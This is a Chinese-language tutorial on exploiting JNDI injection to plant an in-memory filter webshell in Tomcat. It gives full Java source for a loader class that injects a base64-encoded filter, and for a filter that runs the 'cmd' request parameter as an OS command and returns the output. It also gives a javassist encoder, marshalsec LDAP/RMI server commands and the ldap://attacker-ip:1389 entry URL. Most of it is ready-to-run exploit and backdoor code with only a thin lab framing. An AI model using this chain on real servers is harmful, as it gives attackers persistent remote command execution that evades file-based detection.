

JNDI允许通过命名服务动态加载远程对象，当lookup()方法的URL参数可控时，攻击者可构造恶意JNDI服务地址（RMI/LDAP），诱导客户端访问攻击者控制的目录服务。

## **JNDI注入内存马流程**
```
1. 恶意类 
2. 编译恶意类并托管在HTTP服务器
3. 启动LDAP服务并将引用指向上一步Http服务器中的恶意类

目标：
1. 客户端执行可控代码：context.lookup("ldap://attacker-ip:1389/Exploit")
2. JNDI客户端请求LDAP服务
3. LDAP返回恶意Reference对象
4. 客户端解析Reference时：
   1. 从codebase指定URL动态加载
   2. 实例化恶意类触发构造函数/static代码块
```
#### **问题解决**
1、解决代码执行：
下载的类中会被自动执行的地方只有三个代码块，分别是static{}，{}和无参构造方法。

2、获取StandardContext对象注册servlet系列马：
这三个地方可没有Request对象传入，我们要怎么拿到StandardContext呢？
参考这篇文章：<https://xz.aliyun.com/news/9369>
如果是Tomcat8.5以下可以通过这段代码拿到（重点要说明一下，版本不兼容的坑也就出现在这里）
```
WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
StandardRoot standardroot = (StandardRoot) webappClassLoaderBase.getResources();
StandardContext standardContext = (StandardContext) standardroot.getContext();
```
Tomcat9 (vulhub的fastjson1.2.24rce靶场，JdbcRowSetImpl打lookup的JNDI时) 
通过反射获取StandardContext。
```
public StandardContext getContextTomcat9() {
    WebappClassLoaderBase webappClassLoaderBase =(WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();

    Field field = null;
    try {
        field = WebappClassLoaderBase.class.getDeclaredField("resources");
    } catch (NoSuchFieldException e) {
        throw new RuntimeException(e);
    }
    field.setAccessible(true);
    StandardRoot standardRoot = null;
    try {
        standardRoot = (StandardRoot) field.get(webappClassLoaderBase);
    } catch (IllegalAccessException e) {
        throw new RuntimeException(e);
    }
    StandardContext context = (StandardContext) standardRoot.getContext();
    return  context;
}
```
^
3、依赖了Spring框架：
如果依赖了Spring框架，可以直接获取RequestMappingHandlerMapping和Request直接注册控制器马或拦截器马。
```
(ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()
```


^
## **实验**
准备一个受害者环境，Tomcat8.0（非Tomcat8.5及以上版本）和Java8u62
注意：在 JDK 8u191 com.sun.jndi.ldap.object.trustURLCodebase属性的默认值被调整为false，这会导致无法下载远程类到本地，也就是无法利用。但是还是会有绕过方式，自行测试。

^
这里被ldap载入的恶意类为Inject。
过滤器内存马类为ShellFilter，被编译编码为base64字符串，在Inject中重新类加载。
Inject类如下：
```
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.catalina.webresources.StandardRoot;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;
import javax.servlet.Filter;
import java.lang.reflect.Method;
import java.util.Base64;

public class Inject {
    public StandardContext getContext() {
        WebappClassLoaderBase webappClassLoaderBase =(WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
        StandardRoot standardroot = (StandardRoot) webappClassLoaderBase.getResources();
        StandardContext context = (StandardContext) standardroot.getContext();
        return context;
    }
    public Filter getFilter() throws Exception {
        String code = "yv66vgA..."; //ShellFilter类
        byte[] bytes = Base64.getDecoder().decode(code);

        ClassLoader cl = Thread.currentThread().getContextClassLoader();
        Method method = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
        method.setAccessible(true);
        Class clazz = (Class) method.invoke(cl, bytes, 0, bytes.length);
        Filter filter = (Filter) clazz.newInstance();
        return filter;
    }
    public Inject() throws Exception {
        StandardContext context = getContext();
        Filter filter = getFilter();

        FilterDef filterDef = new FilterDef();
        filterDef.setFilterName("shell");
        filterDef.setFilter(filter);
        filterDef.setFilterClass(filter.getClass().getName());

        FilterMap filterMap = new FilterMap();
        filterMap.setFilterName("shell");
        filterMap.addURLPattern("/*");

        context.addFilterDef(filterDef);
        context.addFilterMapBefore(filterMap);
        context.filterStart();
        System.out.println("注入成功");
    }
}
```
ShellFilter类如下：
```
import javax.servlet.*;
import java.io.*;
public class ShellFilter implements Filter {
    @Override
    public void init(FilterConfig filterConfig) {}
    @Override
    public void destroy() {}
    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain filterChain) throws IOException, ServletException {
        String cmd = request.getParameter("cmd");
        if (cmd != null) {
            Process process = Runtime.getRuntime().exec(cmd);
            BufferedReader bufferedReader = new BufferedReader(
                    new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = bufferedReader.readLine()) != null) {
                response.getWriter().println(line);
            }
        }
        filterChain.doFilter(request,response);
    }
}
```
编译转化为base64类
```
<dependency>
    <groupId>org.javassist</groupId>
    <artifactId>javassist</artifactId>
    <version>3.30.2-GA</version>
</dependency>


import javassist.*;
import javax.servlet.Filter;
import java.util.Base64;

public class DumpBase64 {
    public static void main(String[] args) throws Exception{
        ClassPool pool = ClassPool.getDefault();
        // 从类路径获取CtClass对象
        CtClass ctClass = pool.get("ShellFilter");

        // 转换为字节数组
        byte[] classBytes = ctClass.toBytecode();

        // 使用BASE64Encoder进行Base64编码
        String code = Base64.getEncoder().encodeToString(classBytes);
        System.out.println(code);
    }
    class EvilFilter{

    }
}
```
编译Inject.class并放入一个http服务器目录下。
```
python3  -m http.server 8080同目录放Inject.class
```
我们借助marshalsec项目，启动一个RMI或LDAP服务器，监听9999端口，并制定加载远程类Inject.class
RMI转发到8080
```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://xx.xx.xx:8000/#Inject" 9999

java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://192.168.100.1/#Inject" 1389
```
入口
```
ldap://192.168.100.1:1389/Inject
```
